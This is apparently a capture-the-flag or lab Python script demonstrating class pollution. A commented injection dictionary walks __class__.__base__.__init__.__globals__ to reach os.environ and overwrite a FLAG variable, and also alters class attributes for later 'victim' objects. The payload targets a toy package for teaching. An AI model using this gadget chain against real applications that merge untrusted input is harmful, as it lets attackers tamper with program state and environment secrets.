from myPackage.utils import *
from myPackage import User, Person
import os

# change here
injection = {} 
# end of change

'''
injection = {
    '__class__' : 
    {   
        '__qualname__':'Permanent Pollution #4', # change the output of type(objectOfUser)
        '__base__':{
            '__qualname__': 'Permanent Pollution #4', # change the output of type(objectOfPerson)
            'target1' : 'Permanent Pollution #1', # change static (class) variable, target1
            '__init__': {
                '__globals__': {
                    'os':{
                        'environ' : {
                            'FLAG' : 'Permanent Pollution #5' # change environment variable
                        }
                    }
                }
            }

        }
        
    },
    'target2' : 'Temporary Pollution #2', # change instance variable target2
    'target3' : 'Temporary Pollution #3' # change instance variable target3
}
'''


abc = User("Try to change me")
os.environ['FLAG'] = 'false'
merge(injection, abc)

# change here
print(abc.__class__)
#print(dir(abc)) => ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'target1', 'target2', 'target3']
# print(abc.__class__.__base__.__init__.__name__)
# print(dir(abc.__class__.__base__.__init__)) # We navigate to a function attribute (Any function really) to access the __globals__ attribute
#  abc.__class__.__base__.__init__.__globals__ returns a big dictionary
# it contains all functions (merge, save_feedback_to_disk), classes (json etc) and modules as attribute of the namespace the class defintion is in
# print(abc.__class__.__base__.__init__.__globals__.keys()) #dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__path__', '__file__', '__cached__', '__builtins__', 'utils', 'os', 'glob', 'time', 'merge', 'save_feedback_to_disk', 'json', 'Person', 'User'])
# Since we want to access os module, we will get os from __globals__
# print(abc.__class__.__base__.__init__.__globals__.get('os').environ['FLAG']) #false
# end of change

print(abc)
print("Target 1: ",abc.target1)
print("Target 2: ",abc.target2)
print("Target 3: ",abc.target3)

nextUser = User("Victim")
print(nextUser)
print("Target 1: ",nextUser.target1)
print("Target 2: ",nextUser.target2)
print("Target 3: ",nextUser.target3)

nextPerson = Person("Hopeless victim")
print(nextPerson)
print("Target 1: ",nextPerson.target1)

print(type(nextUser)==type(nextPerson)) # Although both outputs '<class 'myPackage.Permanent Pollution #4'>', this will show false

if os.environ['FLAG'] != 'false':
    print("FLAG{DASDASD}")